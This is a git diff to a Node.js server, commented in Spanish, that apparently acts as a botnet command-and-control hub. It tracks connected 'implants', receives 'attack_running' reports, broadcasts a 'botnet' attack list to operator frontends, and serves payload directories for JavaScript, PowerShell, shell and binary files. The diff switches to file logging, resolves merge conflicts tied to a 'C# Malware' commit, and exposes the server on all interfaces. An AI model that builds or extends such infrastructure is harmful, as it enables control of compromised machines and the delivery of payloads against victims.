@@ -14,7 +14,8 @@ import cors from 'cors';
 import jwt from 'jsonwebtoken';
 import path from 'path';
 import { fileURLToPath } from 'url';
-
+import fs from 'fs';
+import { readLastLines, writeLog } from './routes/writeLog.mjs';
 
 
 
@@ -24,6 +25,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
     const server = new WebSocketServer({ server: httpServer });
     const agents = new Map();   // Mapa de agents conectados (por ID)
     const users = new Set();  // Set de users conectados (frontends)
+    const events = [];
     
 
     server.on('connection', (socket, request) => {
@@ -31,6 +33,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
       const clientId = url.searchParams.get('id');
       const rol = url.searchParams.get('rol');
       const token = url.searchParams.get('token');
+
 
       if (rol === 'usuario') {
         try {
@@ -61,19 +64,23 @@ const webSocketsServer = async (httpServer, attacks_running) => {
         return;
       }
 
+      
+
       if (agents.has(clientId)) {
-        console.log(`Agente ${clientId} ya conectado. Reemplazando conexión.`);
+        writeLog(`Agente ${clientId} ya conectado. Reemplazando conexión.`)
         agents.get(clientId).terminate();
       }
-
-
-      console.log(`Agente conectado con ID: ${clientId}`);
-      agents.set(clientId, socket);
+      
+      writeLog(` | Agente conectado con ID: ${clientId}`)
+      
+      events.push();
+      
       socket.isAlive = true;
-
+      agents.set(clientId, socket);
+      
       //------------------------Datos proveniente de implantes-------------------------
       socket.on('message', (data) => {
-          const data_parsed = JSON.parse(data);
+        const data_parsed = JSON.parse(data);
           
         
           if(!data_parsed.error) {
@@ -87,10 +94,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
                       a.target !== data_parsed.target
                     ); 
                   } else if(data_parsed.status === 'attack_running') {
-<<<<<<< HEAD
                     
-=======
->>>>>>> parent of 0562887 (C# Malware)
                     // Solo agregar si es un nuevo ataque
                   const exists = attacks_running.attacks.some(a => 
                       a.attack_type === data_parsed.attack_type && 
@@ -108,7 +112,7 @@ const webSocketsServer = async (httpServer, attacks_running) => {
 
 
       socket.on('close', () => {
-        console.log(`Agente ${clientId} desconectado`);
+        writeLog(` | Agente ${clientId} desconectado`)
         agents.delete(clientId);
       });
     });
@@ -116,10 +120,20 @@ const webSocketsServer = async (httpServer, attacks_running) => {
     // Intervalo para verificar estado de los agents y notificar users
     const interval = setInterval(async () => {
       const db_clients = await Implant.find(); // Asumo que `clients` es una colección de DB
+
+      
       const client_db_list = db_clients.map(x => x);
       const status_connections = [];
 
+
+  /*     for (const key of agents.keys()) {
+        console.log("socket:",key);
+      }
+       */
       client_db_list.forEach((c) => {
+        /* console.log("db:",c.impl_id); */
+        
+        //Estado de los agentes
         const ws = agents.get(c.impl_id);
         if (ws) {
           if (ws.isAlive) {
@@ -137,8 +151,10 @@ const webSocketsServer = async (httpServer, attacks_running) => {
       // Enviar estados a todos los users conectados
       const payload = {
         data: status_connections,
-        botnet: attacks_running.attacks
+        botnet: attacks_running.attacks,
+        events: readLastLines()
       };
+      
       
     // Reenviar a todos los users
     users.forEach(userSocket => {
@@ -170,19 +186,14 @@ const main = async () =>{
     await db_connection();
     app.use(cors());
     
-    app.use(helmet())
+    app.use(helmet());
 
     let attacks_running={attacks:[]};
     
     app.use(express.json())
     app.use(express.urlencoded({ extended: true })); // Para formularios HTML
 
-<<<<<<< HEAD
-    ;
     app.use('/api/arts/js',express.static(path.join(__dirname, 'public/arts/js/') ));
-=======
-    app.use('/api/arts/js', express.static(path.join(__dirname, 'public/arts/js/') ));
->>>>>>> parent of 0562887 (C# Malware)
     app.use('/api/arts/power', express.static(path.join(__dirname, 'public/arts/power/') ));
     app.use('/api/arts/sh', express.static(path.join(__dirname, 'public/arts/sh/') ));
     app.use('/api/arts/bin', express.static(path.join(__dirname, 'public/arts/bin/') ));
@@ -199,7 +210,7 @@ const main = async () =>{
     app.use(type_errors);
     app.use(syntax_errors);
     
-    server.listen(process.env.PORT, 'localhost', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
+    server.listen(process.env.PORT, '0.0.0.0', ()=> console.log(`Esuchando en el puerto ${process.env.PORT}`))
 
 }
 main()
